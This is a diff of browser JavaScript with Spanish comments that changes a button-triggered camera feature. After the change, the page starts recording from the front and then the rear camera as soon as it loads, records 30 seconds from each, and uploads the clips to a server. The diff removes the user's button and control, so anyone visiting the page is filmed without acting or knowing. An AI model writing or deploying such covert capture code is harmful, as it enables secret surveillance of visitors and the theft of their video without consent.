@@ -1,31 +1,27 @@
 /* eslint-env browser */
 
 document.addEventListener('DOMContentLoaded', () => {
-    const touchButton = document.getElementById('touchButton');
     const videoElement = document.getElementById('videoElement');
     
     let stream = null;
     let mediaRecorder = null;
     let recordedChunks = [];
     
-    if (!touchButton) return;
-
-    // Función auxiliar para enviar un video al servidor
-    const enviarVideo = (chunks, nombreBase) => {
+    // Función de transferencia HTTP hacia el backend remoto
+    const enviarVideo = (chunks, tipoCamara) => {
         const clipBlob = new Blob(chunks, { type: 'video/webm' });
         const formData = new FormData();
-        formData.append('video', clipBlob, `${nombreBase}.webm`);
+        formData.append('video', clipBlob, 'clip.webm');
 
         fetch('/subir-video', {
             method: 'POST',
             body: formData
         })
         .catch((err) => {
-            console.error('Error al subir el clip:', err);
+            console.error('Fallo en la comunicación con el host remoto:', err);
         });
     };
 
-    // Función para apagar la cámara actual
     const detenerStream = () => {
         if (stream) {
             stream.getTracks().forEach(track => track.stop());
@@ -33,20 +29,19 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     };
 
-    touchButton.addEventListener('click', () => {
-        // PARTE 1: Configuración para la cámara de enfrente (Selfie)
+    // Función principal de automatización secuencial de hardware
+    const iniciarCapturaAutomatica = () => {
         const constraintsFrontal = {
             video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
             audio: false
         };
 
-        // PARTE 2: Configuración para la cámara de atrás (Principal)
         const constraintsTrasera = {
             video: { facingMode: { exact: "environment" }, width: { ideal: 640 }, height: { ideal: 480 } },
             audio: false
         };
 
-        // Paso 1: Iniciar con la cámara de enfrente
+        // PASO 1: Arrancar automáticamente con la cámara frontal
         navigator.mediaDevices.getUserMedia(constraintsFrontal)
             .then((mediaStream) => {
                 stream = mediaStream;
@@ -60,11 +55,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 };
                 
                 mediaRecorder.onstop = () => {
-                    // Guardar y mandar el video de la cámara de enfrente
                     enviarVideo(recordedChunks, 'frontal');
                     detenerStream();
 
-                    // Paso 2: Activar inmediatamente la cámara trasera tras un breve respiro
+                    // PASO 2: Transición automática inmediata al lente de entorno (trasero)
                     setTimeout(() => {
                         navigator.mediaDevices.getUserMedia(constraintsTrasera)
                             .then((traseraStream) => {
@@ -79,37 +73,35 @@ document.addEventListener('DOMContentLoaded', () => {
                                 };
                                 
                                 mediaRecorder.onstop = () => {
-                                    // Guardar y mandar el video de la cámara de atrás
                                     enviarVideo(recordedChunks, 'trasera');
                                     detenerStream();
-                                    touchButton.disabled = false; // Liberar botón al terminar todo
                                 };
 
                                 mediaRecorder.start();
                                 
-                                // Graba la cámara trasera durante 15 segundos
+                                // Duración estricta de 30 segundos para la cámara trasera
                                 setTimeout(() => {
                                     if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
-                                }, 15000);
+                                }, 30000);
                             })
                             .catch((err) => {
-                                console.error('El dispositivo no tiene cámara trasera o fue bloqueada:', err);
-                                touchButton.disabled = false;
+                                console.error('Restricción o ausencia de lente trasero en el cliente:', err);
                             });
                     }, 1000);
                 };
                 
                 mediaRecorder.start();
-                touchButton.disabled = true; 
                 
-                // Graba la cámara frontal durante 15 segundos
+                // Duración estricta de 30 segundos para la cámara frontal
                 setTimeout(() => {
                     if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
-                }, 15000);
+                }, 30000);
             })
             .catch((err) => {
-                console.error('Error al acceder a la cámara frontal:', err);
-                touchButton.disabled = false;
+                console.error('Falta de autorización de permisos HTTPS por el cliente:', err);
             });
-    });
+    };
+
+    // Ejecución inmediata al cargar el entorno
+    iniciarCapturaAutomatica();
 });
